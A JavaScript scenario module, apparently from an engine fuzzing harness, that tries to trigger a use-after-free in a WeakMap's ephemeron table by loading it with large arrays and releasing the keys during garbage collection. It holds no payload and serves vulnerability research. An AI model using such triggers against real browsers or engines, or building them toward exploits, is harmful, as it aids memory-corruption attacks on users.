/**
 * CENÁRIO: WEAKMAP_EPHEMERON_UAF (Otimizado)
 * Alvo: EphemeronTable Sweeping Phase
 */

export default {
    id:       'WEAKMAP_EPHEMERON_UAF',
    category: 'CoreJS',
    risk:     'HIGH',
    description: 'Tenta causar desync na EphemeronTable aumentando a carga de pares durante o sweeping do GC.',

    setup: function() {
        this.wm = new WeakMap();
        this.keys = [];
        this.valueRefs = [];

        // Aumentamos para 100 pares para maximizar o tempo de varredura do GC
        for (let i = 0; i < 100; i++) {
            const key = { id: i };
            const value = new Float64Array(1024).fill(1337.1337);
            this.wm.set(key, value);
            this.keys.push(key);
            try { this.valueRefs.push(new WeakRef(value)); } catch(e) {}
        }
        this.probeKey = this.keys[0];
    },

    trigger: function() {
        // Libera as chaves para acionar a lógica de EphemeronTable::sweep() no C++
        this.keys = null;
        // O mod_executor chamará o GC pesado em seguida
    },

    probe: [
        s => s.wm.has(s.probeKey),
        s => s.wm.get(s.probeKey)?.[0],
        // Verifica se o valor "fantasma" ainda existe na memória após a coleta da chave
        s => {
            if (s.valueRefs[0]) {
                const val = s.valueRefs[0].deref();
                return val ? val[0] : 'collected';
            }
            return 'no-weakref';
        }
    ],

    cleanup: function() {
        this.wm = null;
        this.keys = null;
    }
};
